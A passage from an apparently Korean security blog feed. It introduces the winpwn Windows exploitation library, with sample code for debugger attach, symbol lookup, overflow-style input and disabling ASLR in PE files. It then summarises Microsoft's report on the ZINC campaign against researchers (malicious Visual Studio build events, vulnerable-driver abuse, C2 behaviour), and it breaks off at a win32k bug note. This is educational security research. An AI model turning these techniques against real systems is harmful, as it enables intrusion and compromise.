winpwn</h1><p>&#xD3EC;&#xB108;&#xBE14;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xC168;&#xB358; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; pwntools&#xC740; &#xBAA8;&#xB974;&#xC2DC;&#xB294; &#xBD84;&#xC774; &#xC5C6;&#xC744; &#xAC70;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xB9AC;&#xB205;&#xC2A4; &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xD560; &#xB54C; &#xAF2D; &#xD544;&#xC694;&#xD55C; &#xD234;&#xC774;&#xC8E0;.<br>&#xADF8;&#xB7F0;&#xB370;..! pwntools&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xD658;&#xACBD;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC740; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#x3160;&#x3160; </p><p><a href="https://github.com/Byzero512/winpwn">winpwn</a>&#xC740; &#xAE30;&#xC874; pwntools&#xC5D0;&#xC11C; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC708;&#xB3C4;&#xC6B0; &#xD658;&#xACBD;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D;, &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD55C; &#xD234;&#xC785;&#xB2C8;&#xB2E4;. pwintools&#xC774;&#xB780; &#xC774;&#xB984;&#xC758; &#xBE44;&#xC2B7;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xB3C4; &#xC788;&#xB358;&#xB370;, &#xC81C; &#xAE30;&#xC900;&#xC5D0;&#xC11C;&#xB294; winpwn&#xC774; &#xC4F0;&#xAE30;&#xC5D0; &#xB354; &#xD3B8;&#xD558;&#xB354;&#xB77C;&#xAD6C;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC624;&#xB298;&#xC740; winpwn&#xC5D0; &#xB300;&#xD574; &#xC9E7;&#xAC8C; &#xC18C;&#xAC1C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xC124;&#xCE58;"><a href="#&#xC124;&#xCE58;" class="headerlink" title="&#xC124;&#xCE58;"></a>&#xC124;&#xCE58;</h1><p><code>pip/pip3 install winpwn</code> &#xC73C;&#xB85C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xB514;&#xBC84;&#xAC70; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC774; &#xCD94;&#xAC00;&#xB85C; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>C:\\Users\\[&#xC0AC;&#xC6A9;&#xC790;]</code> &#xACBD;&#xB85C;&#xC5D0; <a href="https://github.com/Byzero512/winpwn/blob/master/.winpwn">.winpwn</a> &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xB514;&#xBC84;&#xAC70; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC124;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB2E4;&#xC74C; &#xD30C;&#xC774;&#xC36C; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;<ul><li>pip install pefile</li><li>pip install keystone</li><li>pip install capstone</li></ul></li></ol><p>keystone &#xC124;&#xCE58; &#xC2DC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5D0;&#xB7EC;&#xB294; Visual C++ Compiler for Python 2.7 &#xB610;&#xB294; OpenSSL &#xC124;&#xCE58;&#xB85C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xBD88;&#xCE5C;&#xC808;&#xD55C; &#xC124;&#xCE58; &#xC5D0;&#xB7EC; &#xBA54;&#xC2DC;&#xC9C0;..</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/3.png" alt></p><blockquote><p>&#xADF8;&#xB798;&#xB3C4; &#xD30C;&#xC774;&#xC36C;&#xC778;&#xAC8C; &#xC5B4;&#xB514;&#xC5D0;&#xC694; &#x314B;&#x314B;</p></blockquote><p>&#xCD94;&#xAC00;&#xB85C; Windows Terminal&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xC608;&#xC058;&#xAC8C; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xB2C8; Microsoft Store&#xC5D0;&#xC11C; &#xC124;&#xCE58;&#xD574;&#xC8FC;&#xC138;&#xC694;. Windows Terminal&#xC744; &#xC124;&#xCE58;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC774;&#xC81C;&#xBD80;&#xD130; cmd&#xB791; &#xD30C;&#xC6CC;&#xC258; &#xAC16;&#xB2E4; &#xBC84;&#xB9AC;&#xACE0; &#xC774;&#xAC70; &#xC4F0;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/6.png" alt></p><blockquote><p>Windows Terminal &#xC4F0;&#xC138;&#xC694;!! &#xB450; &#xBC88; &#xC4F0;&#xC138;&#xC694;!!!</p></blockquote><h1 id="&#xAE30;&#xB2A5;"><a href="#&#xAE30;&#xB2A5;" class="headerlink" title="&#xAE30;&#xB2A5;"></a>&#xAE30;&#xB2A5;</h1><p>&#xC124;&#xCE58;&#xB3C4; &#xD588;&#xC73C;&#xB2C8; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xC4F0;&#xC73D; &#xB458;&#xB7EC;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? </p><p>&#xC6B0;&#xC120; &#xAE30;&#xC874; pwntools&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xC9C0;&#xC6D0;&#xD558;&#xBA70; &#xAC70;&#xAE30;&#xC5D0; Windows&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; PE &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D;&#xC744; &#xC704;&#xD574; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xAE30;&#xB2A5;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC8E0;. &#xC9C0;&#xAE08;&#xBD80;&#xD130; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="Debugger-attach"><a href="#Debugger-attach" class="headerlink" title="Debugger attach"></a>Debugger attach</h2><p>&#xAE30;&#xC874; pwntools&#xC5D0;&#xC11C;&#xB294; <code>gdb.attach()</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD574; gdb&#xC5D0; attach &#xD560; &#xC218; &#xC788;&#xC5C8;&#xB2E4;&#xBA74; pwintools&#xC5D0;&#xC11C;&#xB294; <code>windbg.attach()</code> &#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; windbg&#xC5D0; attach &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. windbg preview, x64dbg, mingw gdb&#xB3C4; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8; &#xB4F1;&#xC758; script&#xB3C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB85C; windbg preview&#xC5D0; attach &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#.winpwn &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC744;&#xACBD;&#xC6B0; &#xC791;&#xC131;</span><span class="hljs-comment">#context.debugger=&quot;windbgx&quot;</span><span class="hljs-comment">#context.windbgx=&quot;C:\\Users\\dw0rdptr\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)windbgx.attach(p, script=<span class="hljs-string">&quot;bp 0xbe1106&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span>)input()</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/4.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; windbg preview&#xB3C4; &#xC798; &#xBD99;&#xACE0;, &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB3C4; &#xC544;&#xC8FC; &#xC798; &#xAC78;&#xB9B0; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB118;&#xB098; &#xD3B8;&#xD55C;&#xAC83;&#x2026;</p><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><p>pwntools&#xC5D0;&#xC11C; <code>elf</code>&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC5F4;&#xC5B4; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xC744; &#xAD6C;&#xD558;&#xB4EF;&#xC774; winpwn&#xC5D0;&#xC11C;&#xB294; <code>winfile</code> &#xB85C; pe &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; <code>symbols</code> &#xD568;&#xC218;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; dll&#xC758; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xC758; IAT/EAT offset&#xC744; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">&quot;debug&quot;</span>context.arch=<span class="hljs-string">&quot;i386&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)pe = winfile(<span class="hljs-string">&quot;./binary.exe&quot;</span>)ntdll = winfile(<span class="hljs-string">&quot;./ntdll.dll&quot;</span>)print(<span class="hljs-string">&quot;exit offset : &quot;</span>+hex(pe.symbols[<span class="hljs-string">&quot;exit&quot;</span>]))print(<span class="hljs-string">&quot;RtlInitializeSListHead :&quot;</span>+hex(ntdll.symbols[<span class="hljs-string">&quot;RtlInitializeSListHead&quot;</span>]))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">20</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/5.png" alt></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; <code>ntdll.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD574; &#xAC01; &#xBAA8;&#xB4C8;&#xC758; &#xD568;&#xC218; &#xC624;&#xD504;&#xC14B;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC678;&#xC5D0;&#xB3C4; <code>context.log_level</code>&#xC744; <code>debug</code>&#xB85C; &#xC124;&#xC815;&#xD574; pwntools&#xC5D0;&#xC11C; &#xC775;&#xC219;&#xD558;&#xAC8C; &#xBD24;&#xB358; send, receive &#xC815;&#xBCF4;&#xAC00; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xAC83;&#xB3C4; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;!</p><h2 id="Disable-DYNAMICBASE"><a href="#Disable-DYNAMICBASE" class="headerlink" title="Disable DYNAMICBASE"></a>Disable DYNAMICBASE</h2><p>winpwn&#xC5D0;&#xC11C;&#xB294; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xC6B0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C; &#xBC30;&#xCE58;&#xD558;&#xB294; DynamicBase &#xAE30;&#xB2A5;&#xC744; &#xAC04;&#xD3B8;&#xD558;&#xAC8C; &#xB044;&#xACE0; &#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xC77C;&#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; <code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</code> &#xC139;&#xC158;&#xC744; &#xC218;&#xC815;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC8E0;</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOPIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics &amp;= \        ~pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics |= \        pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)</code></pre><p><code>NOPIE(&quot;./binary.exe&quot;)</code> &#xD639;&#xC740; <code>PIE(&quot;./binary.exe&quot;)</code> &#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAE30;&#xB2A5; &#xC678;&#xC5D0;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xACE0; &#xC4F8; &#xC218;  &#xC788;&#xB294; <code>readm</code>, <code>writem</code> &#xB4F1; &#xC720;&#xC6A9;&#xD55C; &#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC678;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC740; pwntools&#xB97C; &#xB9CC;&#xC838;&#xBCF4;&#xC168;&#xB358; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xB611;&#xAC19;&#xC73C;&#xB2C8; &#xAE08;&#xBC29; &#xC775;&#xC219;&#xD574;&#xC9C8; &#xAC81;&#xB2C8;&#xB2E4;..!</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xC708;&#xB3C4;&#xC6B0; &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xB54C; &#xC9C4;&#xC785;&#xC7A5;&#xBCBD;&#xC774; &#xC0C8;&#xB85C;&#xC6B4; &#xD658;&#xACBD;&#xACFC; &#xD234;&#xC778;&#xB370;, &#xC775;&#xC219;&#xD55C; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xAD1C;&#xCC2E;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xD558;&#xACE0; &#xC18C;&#xAC1C;&#xD55C; &#xD234;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!<br>&#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows&#xC758; Low Fragmentation Heap&#xC744; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>cool&#xD558;&#xACE0; sexy&#xD558;&#xAC8C; &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xBD80;&#xC218;&#xB294; &#xADF8;&#xB0A0;&#xAE4C;&#xC9C0;..!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>pwnable</tag>
      
      <tag>L0ch</tag>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ZINC attacks against security researchers</title>
    <link href="/2021/01/30/fabu1ous/2021-01-30/"/>
    <url>/2021/01/30/fabu1ous/2021-01-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/">ZINC attacks against security researchers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Security researchers using Windows machine</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MSTIC(Microsoft Threat Intelligence Center)&#xC5D0;&#xC11C; ZINC&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xCD94;&#xC801; &#xC911;&#xC778; Actor&#xC758; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xD0D0;&#xC9C0;&#xD588;&#xB2E4;&#xACE0; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><p>Social Engineering</p><p>ZINC&#xB294; &#xC0AC;&#xD68C; &#xACF5;&#xD559;&#xC801; &#xD574;&#xD0B9;&#xC744; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC5D0;&#xAC8C; &#xC811;&#xADFC;&#xD574; &#xADF8;&#xB4E4;&#xC5D0;&#xAC8C; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xBC30;&#xD3EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>SNS</p><p>ZINC&#xB294; &#xB192;&#xC740; &#xD004;&#xB9AC;&#xD2F0;&#xC758; &#xCF58;&#xD150;&#xCE20;&#xB97C; &#xB9AC;&#xD2B8;&#xC717;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xD2B8;&#xC704;&#xD130; &#xACC4;&#xC815;&#xC744; &#xC6B4;&#xC601;&#xD558;&#xBA74;&#xC11C; &#xB300;&#xB7B5; 2000&#xBA85;&#xC758; &#xD314;&#xB85C;&#xC6CC;&#xB97C; &#xBAA8;&#xC73C;&#xB294; &#xB4F1; &#xBCF4;&#xC548; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0;&#xC5D0;&#xC11C; &#xC785;&#xC9C0;&#xB97C; &#xB113;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;. SNS&#xB97C; &#xD1B5;&#xD574; &#xC7A0;&#xC7AC;&#xC801; &#xD0C0;&#xAC9F;&#xC5D0;&#xC11C; &#xC811;&#xADFC; &#xD6C4; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xC774;&#xC288;&#xB098; exploit &#xAE30;&#xC220;&#xC5D0; &#xB300;&#xD55C; &#xC9C8;&#xBB38;&#xC744; &#xC8FC;&#xACE0;&#xBC1B;&#xC544; &#xC2E0;&#xB8B0;&#xB97C; &#xC313;&#xACE0;, email&#xC774;&#xB098; discord&#xB97C; &#xD1B5;&#xD574; pgp protected zip&#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xACF5;&#xC720;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Blog</p><p>ZINC&#xB294; br0vvnn&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xBE14;&#xB85C;&#xADF8;&#xB97C; &#xC6B4;&#xC601;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xBE14;&#xB85C;&#xADF8;&#xC758; <code>DOS2RCE: A New Technique To Exploit V8 NULL Pointer Dereference Bug</code>&#xB77C;&#xB294; &#xAE00;&#xC774; &#xD2B8;&#xC704;&#xD130;&#xB85C; &#xACF5;&#xC720;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xC774; &#xBE14;&#xB85C;&#xADF8; &#xB9C1;&#xD06C;&#xB97C; chrome&#xC73C;&#xB85C; &#xC5F4;&#xC5B4;&#xBCF8; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; malware&#xC5D0; &#xAC10;&#xC5FC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li><li><p>Malware</p><p>&#xC0AC;&#xD68C; &#xACF5;&#xD559;&#xC801; &#xD574;&#xD0B9;&#xC744; &#xD1B5;&#xD574; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xB41C; backdoor&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><p>Malicious VS project</p><p>Prebuilt-binary&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC545;&#xC131; Visual Studio &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#xD558;&#xB098;&#xB294; Browse.vc.db&#xB97C; &#xAC00;&#xC7A5;&#xD55C; &#xC545;&#xC131; Comebacker DLL&#xB85C;, &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; dropper &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC545;&#xC131; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xAC00; &#xBE4C;&#xB4DC;&#xB420; &#xB54C; Pre-build event&#xB85C; &#xB4F1;&#xB85D;&#xB41C; PowerShell command&#xAC00; <code>rundll32</code>&#xB97C; &#xD1B5;&#xD574; Combacker DLL&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p></li><li><p>Klackring malware</p><p>&#xC545;&#xC131; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC2EC;&#xB294; DLL&#xC785;&#xB2C8;&#xB2E4;. dropper&#xB97C; &#xD1B5;&#xD574; <code>C:\Windows\system32</code>&#xC5D0; <code>.sys</code>&#xD655;&#xC7A5;&#xC790;&#xB85C; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. </p></li><li><p>MHTML</p></li><li><p>Viraglt64.sys</p><p>CVE-2017-16238 &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAD6C;&#xBC84;&#xC804; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;. dropper&#xC5D0; &#xC758;&#xD574; <code>C:\Windows\System32\drivers\circlassio.sys</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. ZINC&#xB294; CVE-2017-16238&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; 1-day &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C; kernel&#xC5D0; write &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li><li><p>C2 communication</p><p>backdoor&#xB294; command-and-control(C2) &#xCC44;&#xB110;&#xC5D0; 60&#xCD08;&#xB9C8;&#xB2E4; &#xD55C;&#xBC88;&#xC529; check in &#xD569;&#xB2C8;&#xB2E4;. ZINC&#xB294; &#xC774; &#xCC44;&#xB110;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;, &#xD0C0;&#xAC9F;&#xC758; ip&#xC8FC;&#xC18C; &#xD655;&#xBCF4;, NetBIOS &#xD655;&#xBCF4; &#xB4F1;&#xC758; &#xD589;&#xC704;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>social engineering</tag>
      
      <tag>backdoor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows 커널 모드 그래픽 모듈의 권한 상승 취약점</title>
    <link href="/2021/01/29/l0ch/2021-01-29/"/>
    <url>/2021/01/29/l0ch/2021-01-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/27/zdi-can-12671-windows-kernel-dosprivilege-escalation-via-a-null-pointer-deref">ZDI-CAN-12671: WINDOWS KERNEL DOS/PRIVILEGE ESCALATION VIA A NULL POINTER DEREF</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>win32kfull.sys (Windows 32bit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows kernel &#xBAA8;&#xB4C8;&#xC778; <code>win32kfull.sys</code>&#xC5D0;&#xC11C; NULL pointer dereference&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>win32k&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xADF8;&#xB9AC;&#xAE30; &#xC791;&#xC5C5;&#xC740; <code>SURFOBJ</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. <code>SURFOBJ</code> &#xC758; <code>hdev</code> &#xD544;&#xB4DC;&#xB294; &#xD2B9;&#xC815; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC774;&#xBA70; <code>flags</code> &#xD544;&#xB4DC; &#xC911; &#xC77C;&#xBD80;&#xB294; <code>HOOK_ *</code> &#xD50C;&#xB798;&#xADF8;&#xB85C;, <a 